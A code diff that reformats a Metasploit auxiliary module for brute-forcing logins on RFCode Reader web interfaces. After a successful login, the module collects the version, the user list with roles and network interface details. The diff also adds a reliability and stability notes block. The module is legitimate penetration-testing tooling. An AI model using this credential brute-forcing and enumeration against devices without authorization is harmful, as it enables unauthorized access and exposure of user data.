@@ -9,27 +9,33 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::AuthBrute
   include Msf::Auxiliary::Scanner
 
-  def initialize(info={})
-    super(update_info(info,
-      'Name'           => 'RFCode Reader Web Interface Login / Bruteforce Utility',
-      'Description'    => %{
-        This module simply attempts to login to a RFCode Reader web interface.
-        Please note that by default there is no authentication. In such a case, password brute force will not be performed.
-        If there is authentication configured, the module will attempt to find valid login credentials and capture device information.
-      },
-      'Author'         =>
-        [
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'RFCode Reader Web Interface Login / Bruteforce Utility',
+        'Description' => %q{
+          This module simply attempts to login to a RFCode Reader web interface.
+          Please note that by default there is no authentication. In such a case, password brute force will not be performed.
+          If there is authentication configured, the module will attempt to find valid login credentials and capture device information.
+        },
+        'Author' => [
           'Karn Ganeshen <KarnGaneshen[at]gmail.com>'
         ],
-      'License'	 => MSF_LICENSE
-
-    ))
+        'License'	=> MSF_LICENSE,
+        'Notes' => {
+          'Reliability' => UNKNOWN_RELIABILITY,
+          'Stability' => UNKNOWN_STABILITY,
+          'SideEffects' => UNKNOWN_SIDE_EFFECTS
+        }
+      )
+    )
 
     register_options(
       [
         OptBool.new('STOP_ON_SUCCESS', [ true, "Stop guessing when a credential works for a host", true])
-      ])
-
+      ]
+    )
   end
 
   #
@@ -74,7 +80,8 @@ class MetasploitModule < Msf::Auxiliary
           {
             '_dc' => '1369680704481'
           }
-      })
+      }
+    )
     return (res and res.code != 404)
   end
 
@@ -88,14 +95,15 @@ class MetasploitModule < Msf::Auxiliary
 
     res = send_request_cgi(
       {
-        'uri'       => '/rfcode_reader/api/whoami.json',
-        'method'    => 'GET',
-        'authorization' => basic_auth(user,pass),
+        'uri' => '/rfcode_reader/api/whoami.json',
+        'method' => 'GET',
+        'authorization' => basic_auth(user, pass),
         'vars_get'	=>
           {
             '_dc' => '1369680704481'
           }
-      })
+      }
+    )
 
     return (res and res.body =~ /{  }/) ? false : true
   end
@@ -104,19 +112,19 @@ class MetasploitModule < Msf::Auxiliary
   # Brute-force the login page
   #
   def do_login(user, pass)
-
     vprint_status("#{rhost}:#{rport} - Trying username:#{user.inspect} with password:#{pass.inspect}")
     begin
       res = send_request_cgi(
-      {
-        'uri'       => '/rfcode_reader/api/whoami.json',
-        'method'    => 'GET',
-        'authorization' => basic_auth(user,pass),
-        'vars_get'	=>
-          {
-            '_dc' => '1369680704481'
-          }
-      })
+        {
+          'uri' => '/rfcode_reader/api/whoami.json',
+          'method' => 'GET',
+          'authorization' => basic_auth(user, pass),
+          'vars_get'	=>
+            {
+              '_dc' => '1369680704481'
+            }
+        }
+      )
 
       if not res or res.code == 401
         vprint_error("#{rhost}:#{rport} - FAILED LOGIN - #{user.inspect}:#{pass.inspect} with code #{res.code}")
@@ -172,20 +180,19 @@ class MetasploitModule < Msf::Auxiliary
   # Collect target info
   #
   def collect_info(user, pass)
-
     vprint_status("#{rhost}:#{rport} - Collecting information from app as #{user.inspect}:#{pass.inspect}...")
     begin
-
       res = send_request_cgi(
-      {
-        'uri'       => '/rfcode_reader/api/version.json',
-        'method'    => 'GET',
-        'authorization' => basic_auth(user,pass),
-        'vars_get'      =>
-          {
-            '_dc' => '1370460180056'
-          }
-      })
+        {
+          'uri' => '/rfcode_reader/api/version.json',
+          'method' => 'GET',
+          'authorization' => basic_auth(user, pass),
+          'vars_get' =>
+            {
+              '_dc' => '1370460180056'
+            }
+        }
+      )
 
       if res and res.body
         release_ver = JSON.parse(res.body)["release"]
@@ -195,28 +202,29 @@ class MetasploitModule < Msf::Auxiliary
         vprint_good("#{rhost}:#{rport} - Release version: '#{release_ver}', Product Name: '#{product_name}'")
 
         report_note(
-          :host   => rhost,
-          :proto  => 'tcp',
-          :port   => rport,
-          :sname  => "RFCode Reader",
-          :data   => {
+          :host => rhost,
+          :proto => 'tcp',
+          :port => rport,
+          :sname => "RFCode Reader",
+          :data => {
             :release_version => release_ver,
-            :product  => product_name
+            :product => product_name
           },
           :type	=> 'Info'
         )
       end
 
       res = send_request_cgi(
-      {
-        'uri'       => '/rfcode_reader/api/userlist.json',
-        'method'    => 'GET',
-        'authorization' => basic_auth(user,pass),
-        'vars_get'      =>
-          {
-            '_dc' => '1370353972710'
-          }
-      })
+        {
+          'uri' => '/rfcode_reader/api/userlist.json',
+          'method' => 'GET',
+          'authorization' => basic_auth(user, pass),
+          'vars_get' =>
+            {
+              '_dc' => '1370353972710'
+            }
+        }
+      )
 
       if res and res.body
         userlist = JSON.parse(res.body)
@@ -224,25 +232,26 @@ class MetasploitModule < Msf::Auxiliary
         vprint_good("#{rhost}:#{rport} - User list & role: #{userlist}")
 
         report_note(
-          :host   => rhost,
-          :proto  => 'tcp',
-          :port   => rport,
+          :host => rhost,
+          :proto => 'tcp',
+          :port => rport,
           :sname	=> "RFCode Reader",
-          :data   => { :user_list => userlist },
+          :data => { :user_list => userlist },
           :type	=> 'Info'
         )
       end
 
       res = send_request_cgi(
-      {
-        'uri'       => '/rfcode_reader/api/interfacestatus.json',
-        'method'    => 'GET',
-        'authorization' => basic_auth(user,pass),
-        'vars_get'      =>
-          {
-            '_dc' => '1369678668067'
-          }
-      })
+        {
+          'uri' => '/rfcode_reader/api/interfacestatus.json',
+          'method' => 'GET',
+          'authorization' => basic_auth(user, pass),
+          'vars_get' =>
+            {
+              '_dc' => '1369678668067'
+            }
+        }
+      )
 
       if res and res.body
         eth0_info = JSON.parse(res.body)["eth0"]
